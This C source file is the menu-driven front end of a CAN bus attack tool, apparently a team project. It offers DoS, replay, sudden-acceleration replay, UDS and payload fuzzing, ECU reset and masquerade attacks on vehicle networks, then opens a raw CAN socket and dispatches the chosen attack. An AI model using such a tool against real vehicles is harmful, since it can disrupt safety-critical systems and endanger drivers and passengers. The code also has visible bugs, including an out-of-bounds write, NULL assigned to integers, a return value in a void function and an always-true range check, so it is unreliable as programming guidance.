#include "all_headers.h"

/*================================================================
main.c
This program is a CAN packet sender with various attack codes.

Parameters:
- interface: CAN interface name
- attack_code: attack code
- canid: CAN ID (in hexadecimal)
- time_diff: time difference between packets (in ms)
==================================================================*/

char interface[IFNAMSIZ];
int attack_code;
int canid;
int time_diff;
int variable_reset = 0;
int end_program = 0;

void clear_read_buffer() {
    while(getchar()!='\n');
}

void startpage() {
    printf(YELLOW_TEXT);
    printf("        _    _                 _    \n");
    printf("       | |  | |               | |   \n");
    printf("  __ _ | |_ | |_   __ _   ___ | | __\n");
    printf(" / _` || __|| __| / _` | / __|| |/ /\n");
    printf("| (_| || |_ | |_ | (_| || (__ |   < \n");
    printf(" \\__,_| \\__| \\__| \\__,_| \\___||_|\\_\\\n");
    printf(".______           ___      .___  ___. .__   __. \n");
    printf("|   _  \\         /   \\     |   \\/   | |  \\ |  | \n");
    printf("|  |_)  |       /  ^  \\    |  \\  /  | |   \\|  | \n");
    printf("|      /       /  /_\\  \\   |  |\\/|  | |  . `  | \n");
    printf("|  |\\  \\----. /  _____  \\  |  |  |  | |  |\\   | \n");
    printf("| _| `._____|/__/     \\__\\ |__|  |__| |__| \\__|. ver_1.211\n");
    printf("                                               team.YESICAN\n");
    printf(RESET_COLOR);
    
    printf(RED_TEXT);
    printf("press 'm' to go main menu while attack\n");
    printf(RESET_COLOR);
}

void print_get_attack_codes(void) {
    printf("=====================attack  codes======================\n");
    printf("(1): dos_dos                (5): fuzzing_random_canid\n");
    printf("(2): replay_replay          (6): fuzzing_random_payload\n");
    printf("(3): replay_suddenaccel     (7): suspension_resetecu\n");
    printf("(4): fuzzing_find_uds       (8): msq_msq[masquerade]\n");
    printf("========================================================\n\n");
    printf("## Enter attack code you want: ");
}

void get_attack_variables() {
    //reset variables to defaule values && set Fild Descriptor to blocking mode
    attack_code = NULL;
    canid = NULL;
    time_diff = NULL;
    interface[IFNAMSIZ] = '\0';
    set_blocking(STDIN_FILENO);

    while (1) {
        print_get_attack_codes();
        scanf("%d", &attack_code);
        if (attack_code >= 1 && attack_code <= 8) break;
        printf("\nInvalid attack code, Please try again.\n\n");
    }

    printf("## Enter CAN interface name [e.g.:vcan0]: ");
    scanf("%s", interface);

    while (1) {
        printf("## Enter CAN ID (in hexadecimal, [e.g.:0x100]): ");
        scanf("%x", &canid);
        if (canid >= 0x000 && canid <= 0xfff) break;
        printf("\nInvalid CAN ID, Please try again.\n\n");
    }

    while (1) {
        printf("## Enter time difference (in ms), [enter 0 to send once]: ");
        scanf("%d", &time_diff);
        if ((time_diff >= 0) || (time_diff <= 100000)) break;
        printf("\nInvalid time difference, Please try again.\n\n");
    }
}

void attack_program() {
    
    startpage();
    //get user input
    get_attack_variables();
    clear_read_buffer();

    //socket create
    int s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (s < 0) {
        perror("Socket creation error");
        return 1;
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX error");
        close(s);
        return 1;
    }

    struct sockaddr_can addr = {0};
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Socket binding error");
        close(s);
        return 1;
    }

    //call attack_packet_sender
    attack_packet_sender(s, &addr, attack_code, canid, time_diff);
    //close the socket
    close(s);
}


int main() {
    while(1) {
        attack_program();
        printf(RED_TEXT"====================return to main======================\n");
        printf(RESET_COLOR"\n");
        usleep(2000000);
    }
    return 0;
}
